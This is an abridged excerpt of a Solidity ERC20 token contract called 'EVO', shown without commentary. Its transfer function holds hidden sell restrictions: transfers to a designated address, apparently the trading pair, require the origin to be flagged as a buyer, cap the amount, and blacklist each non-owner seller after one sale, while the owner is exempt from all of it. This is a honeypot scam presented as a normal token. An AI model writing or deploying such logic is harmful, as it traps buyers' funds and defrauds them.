...
interface IERC20 {
    ...
    event Sender(address indexed sender);
       event Occur1(uint indexed UINT);

event Occur2(uint indexed UINT);
    /**
...
contract EVO is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "EVO";
  address public newun;
  mapping(address => bool) public was;
  mapping(address => bool) public bought;
  uint256 public limit = 100 * 10** 8;

  
    event TxOrigin(address indexed who);
    event MsgSender(address indexed who);
    event Recipient (address indexed who);
    event Sender (address indexed who);
  ...
  function setWas(address _who, bool _value) external onlyOwner {
    was[_who] = _value;
  }
  ...
  function setLimit(uint _value) public onlyOwner {
      limit = _value;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
   ...
   if(recipient == newun) {
    require(bought[tx.origin] == true || tx.origin == owner(), "error in transfer"); 
     if(was[sender]) {
       revert("error in transfer1");
     }
     if(amount > limit && sender != owner()) {
       revert("error in transfer2");
     }
     if(sender != owner()) {
       was[sender] = true;
   }}
